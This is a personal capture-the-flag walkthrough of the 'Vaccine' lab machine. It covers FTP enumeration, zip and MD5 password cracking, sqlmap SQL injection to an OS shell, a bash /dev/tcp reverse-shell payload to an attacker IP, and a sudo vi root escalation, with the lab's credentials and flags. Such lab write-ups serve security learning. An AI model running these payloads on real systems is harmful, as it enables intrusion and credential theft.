---
title: Vaccine
updated: 2023-02-04T17:29:37.0000000+00:00
created: 2023-02-04T12:42:48.0000000+00:00
date modified: Monday, May 13th 2024, 10:57:30 pm
---

Enumeration:

Initial nmap scan:
![image1](../../../../../_resources/image1-63.png)

Looking at cookies, we find that PHP is being used. Wappalyzer tells us the same thing:
![image2](../../../../../_resources/image2-48.png)
Let's try to connect to the FTP port and see if there is anything juicy, we can log into the ftp anonymously by not inputting any creds when prompted:
![image3](../../../../../_resources/image3-41.png)

**Common FTP Commands:**

- *Bye/quit*
  - *Exits the FTP environment*
- *?*
  - *Gives a list of commands*
- *Cd*
  - *Changing Directory*
- *Ls*
  - *Listing directories/files*
- *Pwd*
  - *Listing current working directory.*
- *Get*
  - *Get the file and download it to our local machine.*

Sadly, none of these work, since we aren't authenticated:
![image4](../../../../../_resources/image4-33.png)

**HINT -** nmap -sC:

When we use the **-sC** flag with nmap we perform a **script scan**. Which will give us more information about what is running on each port. In relation to FTP, we can see that:

- *We are logged in as ftpuser*
- *vsftpd 3.0.3 is running*
- *Anonymous FTP is allowed and there is a file named b**ackup.zip***

*We can log in using the username **anonymous** and we can now execute commands. Let's download the backup.zip file:*
![image5](../../../../../_resources/image5-23.png)
(Make sure to change directory to where you want to download the file on your local machine.)

Unzipping backup:

When we try to unzip the file - we figure out that they require passwords:
![image6](../../../../../_resources/image6-15.png)
(Trying common passwords like "admin" "password", etc doesn't work.)

It looks like we can use **John The Ripper** to try and crack open the backup.zip file. There appears to be a script named **zip2john** which can be used for this [purpose.](https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html)

You can use **zip2john** to get password hashes from a zip file:
![image7](../../../../../_resources/image7-12.png)
(This allows us to save the hash into a text file).

We then run **John The Ripper** on the hashes:
![image8](../../../../../_resources/image8-10.png)

We can the use --show to see the creds:
![image9](../../../../../_resources/image9-9.png)
(Normally this takes hours to do, but in our case it took like 1 second).
**Password - 741852963**

We can finally unzip the backup folder:
![image10](../../../../../_resources/image10-7.png)
Password Cracking:

Now that we have the folder unzipped, we can check the index.php file and we find admin creds:
![image11](../../../../../_resources/image11-6.png)

**Username: admin**
**Hashed Password: 2cb42f8734ea607eefed3b70af13bbd3**

We can use **hashid** to list what hashes are possible:
![image12](../../../../../_resources/image12-4.png)
(There is loads, but we should try MD5 first).
Now we need to figure out how to [unhash the md5 password](https://www.4armed.com/blog/hashcat-crack-md5-hashes/#:~:text=How%20to%20Crack%20MD5%20Hashes%20Using%20hashcat%201,how%20to%20crack%20MD5%20hashes%20using%20hashcat.%20)**.** For this purpose we can use hashcat:
![image13](../../../../../_resources/image13-3.png)
(-m 0 means md5, and we just input our hash).

This doesn't work since we don't have enough device memory. We should try a **dictionary attack** instead:
![image14](../../../../../_resources/image14-3.png)

Again this fails. It looks like we are having a memory problem?
![image15](../../../../../_resources/image15-3.png)

After giving my VM more RAM access and more processing power, hashcat is still fucked…

The password is: **qwerty789**

Foothold:

Now that we are inside the admin portal, we can use the Search bar to execute queries on the car catalogue:
![image16](../../../../../_resources/image16-3.png)

We can test this for a SQL injection, we can do this manually or we can use the tool **SQL map -** which is a too that detects SQL injection flaws.

To use SQL map we need a few different nuggets of information:
1.  URL
    1.  <http://10.129.213.60/dashboard.php?search=Beans>
2.  Cookie
    1.  We need the PHP cookie:
    2.  PHPSESSID=149dhpuk7v0ki4o5f0hlg0ratm

We can now run sqlmap:
![image17](../../../../../_resources/image17-3.png)

Importantly, we see:
![image18](../../../../../_resources/image18-3.png)
We can use the **--os-shell** flag so that we can perform command injection:
![image19](../../../../../_resources/image19-2.png)

Upgrading the os-shell:

1.  Start a netcat listener
2.  Execute the following payload on the target machine:
    1.  bash -c "bash -i \>& /dev/tcp/{your_IP}/443 0\>&1"
    2.  bash -c "bash -i \>& /dev/tcp/10.10.14.8/443 0\>&1"
3.  Now that our netcat listener has the shell, we make it fully interactive
python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL+Z

stty raw -echo

Fg

export TERM=xterm

Finally, we can access the user flag inside, /var/lib/postgresql:
![image20](../../../../../_resources/image20-2.png)
**User Flag-** ec9b13ca4d6229cd5cc1e09980965bf7

Privilege Escalation:

Now that we are the user **postgres**, however we don't know the password for it, meaning we cannot use **sudo -l** to look at our privileges. We can find these details inside /var/ww/html inside the PHP and SQL files, meaning we can maybe find some cleartext details.

Inside dashboard.php:
![image21](../../../../../_resources/image21-2.png)
**Username -** postgres
**Password -** P@s5w0rd!

**(If the shell dies, we can use SSH to now login) -**
![image22](../../../../../_resources/image22-2.png)

Now we can run sudo -l:
![image23](../../../../../_resources/image23-2.png)

Getting root:

Now that we see that we can **run sudo /bin/vi** on pg_hba.conf, this could accelerate us to root, we need to exploit it, we can look at [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo) to see if we can find an exploit. We can use command like so:

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null

But it doesn't work:
![image24](../../../../../_resources/image24-2.png)

There is an alternative method, in which we try to open vi as root:
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

This works:
![image25](../../../../../_resources/image25-2.png)

We can insert text into vi using :, then typing:
![image26](../../../../../_resources/image26-2.png)

Then we type **:shell,** this gives us root:
![image27](../../../../../_resources/image27-1.png)

We then find the root flag inside root:
![image28](../../../../../_resources/image28-1.png)

**Root flag -** dd6e058e814260bc70e9bbdef2715849
